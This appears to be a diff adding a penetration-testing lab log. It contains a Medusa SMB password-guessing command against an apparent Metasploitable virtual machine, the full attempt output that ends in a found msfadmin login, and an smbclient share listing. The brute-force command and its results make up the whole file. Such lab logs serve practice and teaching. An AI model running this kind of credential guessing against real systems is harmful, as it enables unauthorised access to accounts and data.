@@ -1,0 +1,59 @@
+medusa -h 192.168.56.101 -U sub_users.txt -P pass.txt -M smbnt -t 3 -T 50
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+2025-11-28 08:44:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (1 of 7, 0 complete) Password: 123456 (1 of 5 complete)
+2025-11-28 08:44:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (1 of 7, 0 complete) Password: qwerty (2 of 5 complete)
+2025-11-28 08:44:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (1 of 7, 0 complete) Password: msfadmin (3 of 5 complete)
+2025-11-28 08:44:05 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (1 of 7, 1 complete) Password: password (4 of 5 complete)
+2025-11-28 08:44:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 7, 1 complete) Password: 123456 (1 of 5 complete)
+2025-11-28 08:44:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: games (1 of 7, 1 complete) Password: welcome (5 of 5 complete)
+2025-11-28 08:44:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 7, 1 complete) Password: password (2 of 5 complete)
+2025-11-28 08:44:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 7, 1 complete) Password: msfadmin (3 of 5 complete)
+2025-11-28 08:44:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 7, 2 complete) Password: welcome (4 of 5 complete)
+2025-11-28 08:44:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: man (3 of 7, 2 complete) Password: password (1 of 5 complete)
+2025-11-28 08:44:06 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: man (3 of 7, 2 complete) Password: 123456 (2 of 5 complete)
+2025-11-28 08:44:07 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: man (3 of 7, 2 complete) Password: qwerty (3 of 5 complete)
+2025-11-28 08:44:07 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: admin (2 of 7, 2 complete) Password: qwerty (5 of 5 complete)
+2025-11-28 08:44:07 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: man (3 of 7, 3 complete) Password: welcome (4 of 5 complete)
+2025-11-28 08:44:07 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: man (3 of 7, 3 complete) Password: msfadmin (5 of 5 complete)
+2025-11-28 08:44:07 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: daemon (4 of 7, 3 complete) Password: qwerty (1 of 5 complete)
+2025-11-28 08:44:07 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: daemon (4 of 7, 3 complete) Password: msfadmin (2 of 5 complete)
+2025-11-28 08:44:08 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: daemon (4 of 7, 3 complete) Password: password (3 of 5 complete)
+2025-11-28 08:44:08 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: daemon (4 of 7, 4 complete) Password: 123456 (4 of 5 complete)
+2025-11-28 08:44:08 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: daemon (4 of 7, 4 complete) Password: welcome (5 of 5 complete)
+2025-11-28 08:44:08 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (5 of 7, 4 complete) Password: password (1 of 5 complete)
+2025-11-28 08:44:08 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (5 of 7, 4 complete) Password: 123456 (2 of 5 complete)
+2025-11-28 08:44:08 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (5 of 7, 4 complete) Password: qwerty (3 of 5 complete)
+2025-11-28 08:44:09 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (5 of 7, 5 complete) Password: msfadmin (4 of 5 complete)
+2025-11-28 08:44:09 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: service (5 of 7, 5 complete) Password: welcome (5 of 5 complete)
+2025-11-28 08:44:09 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 7, 5 complete) Password: password (1 of 5 complete)
+2025-11-28 08:44:09 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 7, 5 complete) Password: 123456 (2 of 5 complete)
+2025-11-28 08:44:09 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 7, 5 complete) Password: qwerty (3 of 5 complete)
+2025-11-28 08:44:09 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 7, 6 complete) Password: welcome (4 of 5 complete)
+2025-11-28 08:44:10 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: msfadmin (6 of 7, 6 complete) Password: msfadmin (5 of 5 complete)
+2025-11-28 08:44:10 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]
+2025-11-28 08:44:10 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (7 of 7, 7 complete) Password: qwerty (1 of 5 complete)
+2025-11-28 08:44:10 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (7 of 7, 7 complete) Password: password (2 of 5 complete)
+2025-11-28 08:44:11 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (7 of 7, 7 complete) Password: welcome (3 of 5 complete)
+2025-11-28 08:44:11 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (7 of 7, 8 complete) Password: 123456 (4 of 5 complete)
+2025-11-28 08:44:11 ACCOUNT CHECK: [smbnt] Host: 192.168.56.101 (1 of 1, 0 complete) User: user (7 of 7, 8 complete) Password: msfadmin (5 of 5 complete)
+
+smbclient -L //192.168.56.101 -U msfadmin
+Password for [WORKGROUP\msfadmin]:
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk      
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        msfadmin        Disk      Home Directories
+Reconnecting with SMB1 for workgroup listing.
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            METASPLOITABLE
